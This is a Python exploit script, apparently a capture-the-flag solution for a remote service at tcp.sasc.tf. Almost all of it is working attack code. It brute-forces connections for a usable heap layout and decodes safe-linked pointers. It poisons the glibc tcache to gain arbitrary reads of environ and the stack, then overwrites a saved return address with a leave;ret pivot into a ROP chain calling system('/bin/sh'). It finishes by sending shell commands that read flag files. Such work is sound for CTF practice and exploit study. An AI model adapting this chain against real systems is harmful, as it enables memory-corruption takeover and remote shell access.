#!/usr/bin/env python3
import concurrent.futures
import socket
import struct
import sys
import threading
import time

HOST = "tcp.sasc.tf"
PORT = 11331
STOP = threading.Event()


def q(x):
    return struct.pack("<Q", x)


def u64(x):
    return struct.unpack("<Q", x)[0]


def padded(x):
    # Keep menu allocations out of the corrupted 0x20 tcache bin.
    return str(x).encode() + b" " * 80 + b"\n"


def recvuntil(sock, marker, timeout=5):
    sock.settimeout(timeout)
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(65536)
        if not chunk:
            break
        data += chunk
    return bytes(data)


def unprotect_self(encoded):
    x = encoded
    for _ in range(6):
        x = encoded ^ (x >> 12)
    return x


def find_good_connection(attempt):
    if STOP.is_set():
        return None
    sock = None
    try:
        sock = socket.create_connection((HOST, PORT), 4)
        recvuntil(sock, b"menu> ")

        # Invalid first transaction + valid second transaction.
        sock.sendall(b"".join([
            padded(3), padded(3), padded(3), padded(0), padded(-1),
            padded(0), padded(2),
        ]))
        recvuntil(sock, b"rows> ")
        sock.sendall(padded(2) + padded(0))
        out = recvuntil(sock, b"rows> ")

        left = out.find(b"tags  : seed")
        right = out.find(b"batch-in", left)
        if left < 0 or right < 0:
            sock.close()
            return None

        raw = out[left + len(b"tags  : seed"):right]
        if len(raw) != 9 or b"\xef\xbf\xbd" in raw:
            sock.close()
            return None

        chunk_b = unprotect_self(u64(raw[:8]))
        target = chunk_b - 0x160
        poison = q(target ^ (chunk_b >> 12)) + b"P" * 8

        try:
            poison.decode("utf-8")
        except UnicodeDecodeError:
            sock.close()
            return None
        if b"\n" in poison:
            sock.close()
            return None

        STOP.set()
        return attempt, sock, chunk_b, poison
    except (OSError, TimeoutError):
        if sock:
            sock.close()
        return None


def main():
    limit = int(sys.argv[1]) if len(sys.argv) > 1 else 15000
    workers = int(sys.argv[2]) if len(sys.argv) > 2 else 48

    winner = None
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
        for done, result in enumerate(pool.map(find_good_connection, range(1, limit + 1)), 1):
            if done % 250 == 0:
                print(f"tried {done}", flush=True)
            if result:
                winner = result
                break

    if not winner:
        raise SystemExit("no UTF-8-compatible heap layout; run again")

    attempt, sock, chunk_b, poison = winner
    print(f"candidate #{attempt}: B={chunk_b:#x}")

    # Put a large chunk in the unsorted bin, then perform the two tcache writes.
    sock.sendall(b"".join([
        padded(1), b"L" * 0x500 + b"\n", padded(0),
        padded(4), padded(3),
        padded(1), poison + b"\n", padded(0),
        padded(1), q(0x4000) + b"A" * 8 + b"\n", padded(0),
        padded(2), padded(0),
    ]))

    marker = b"\nvalue : 900\ntags  : "
    result = recvuntil(sock, marker, 8)
    start = result.rfind(b"name  : ") + 8
    heap = result[start:start + 0x4000]
    if len(heap) != 0x4000:
        raise SystemExit("short heap leak")

    genesis = chunk_b - 0x190
    tags = chunk_b + 0x20
    row0 = (
        q(7) + q(genesis) + q(0x4000) + b"A" * 8 +
        q(tags) + q(21) + q(1) + q(900)
    )
    row_off = heap.find(row0)
    if row_off < 0:
        raise SystemExit("could not locate the moved rows vector")
    rows = genesis + row_off

    arena = u64(heap[0x20:0x28])
    libc = arena - 0x234C20
    print(f"libc={libc:#x}, rows={rows:#x}")

    old_len = 21

    def make_record(name_cap, name_ptr, name_len, next_start):
        nonlocal old_len
        pad_len = rows - (tags + 21) if old_len == 21 else 0
        note_len = pad_len + 64
        new_len = old_len + note_len
        tags_ptr = next_start - new_len

        record = (
            q(name_cap) + q(name_ptr) + q(name_len) +
            q(0x4141414141414141) + q(tags_ptr) + q(old_len) +
            q(1) + q(900)
        )

        if pad_len:
            src = tags + 21 - genesis
            prefix = heap[src:src + pad_len].replace(b"\n", b"\x0b")
        else:
            prefix = b""

        note = prefix + record
        if b"\n" in note:
            raise SystemExit("newline in overflow payload; retry")
        old_len = new_len
        return note

    def deposit(note):
        # Called while sitting at rows>.
        sock.sendall(padded(0) + padded(3))
        recvuntil(sock, b"tx> ", 8)
        sock.sendall(padded(1) + padded(0) + padded(0) + note + b"\n")
        if b"tx> " not in recvuntil(sock, b"tx> ", 8):
            raise SystemExit("deposit failed")

    def view(tag_len):
        # Called while sitting at tx>. Drain the huge tags output exactly.
        sock.sendall(padded(0) + padded(2))
        recvuntil(sock, b"rows> ", 8)
        sock.sendall(padded(2) + padded(0))

        data = bytearray(recvuntil(sock, marker, 8))
        mark = data.find(marker) + len(marker)
        while len(data) < mark + tag_len:
            data += sock.recv(65536)
        after_tags = mark + tag_len
        while b"rows> " not in data[after_tags:]:
            data += sock.recv(65536)
        return bytes(data)

    # Arbitrary read #1: environ.
    environ = libc + 0x23BE28
    deposit(make_record(8, environ, 8, rows))
    data = view(old_len)
    mark = data.find(marker)
    name = data.rfind(b"name  : ", 0, mark) + 8
    stack = u64(data[name:name + 8])
    print(f"environ={stack:#x}")

    # Arbitrary read #2: a large stack window. This also verifies the offset.
    deposit(make_record(0x10000, stack - 0x10000, 0x10000, rows))
    data = view(old_len)
    mark = data.find(marker)
    name = data.rfind(b"name  : ", 0, mark) + 8
    if len(data[name:name + 0x10000]) != 0x10000:
        raise SystemExit("short stack leak")

    pop_rdi = libc + 0x11B93A
    ret = pop_rdi + 1
    bin_sh = libc + 0x1DC4C3
    system = libc + 0x5C4C0
    leave_ret = libc + 0x29B4C

    commit_ret = stack - 0x3D0
    stack_write = commit_ret - 0x30
    heap_rop = rows + 64

    # Store the real chain in row 1 and point the next append below commit's RIP.
    chain = q(0) + q(pop_rdi) + q(bin_sh) + q(ret) + q(system)
    arm_len = 64 + len(chain)
    new_len = old_len + arm_len
    tags_ptr = stack_write - new_len
    record = (
        q(7) + q(genesis) + q(7) + q(0x4141414141414141) +
        q(tags_ptr) + q(old_len) + q(1) + q(900)
    )
    arm = record + chain
    if b"\n" in arm:
        raise SystemExit("newline in arm payload; retry")
    deposit(arm)

    # saved rbx, r12, r13, r14, r15, rbp, RIP
    smash = q(0) * 5 + q(heap_rop) + q(leave_ret)
    if b"\n" in smash:
        raise SystemExit("newline in ROP payload; retry")

    print(f"pivoting commit RIP at {commit_ret:#x}")
    sock.sendall(padded(1) + padded(0) + padded(0) + smash + b"\n")

    # Do not send this with the previous packet: Rust stdin may buffer it.
    time.sleep(1)
    sock.sendall(b"cat /flag* 2>/dev/null; cat flag* 2>/dev/null; exit\n")

    sock.settimeout(10)
    output = bytearray()
    try:
        while True:
            chunk = sock.recv(65536)
            if not chunk:
                break
            output += chunk
    except OSError:
        pass
    print(output.decode("utf-8", "replace"))


if __name__ == "__main__":
    main()


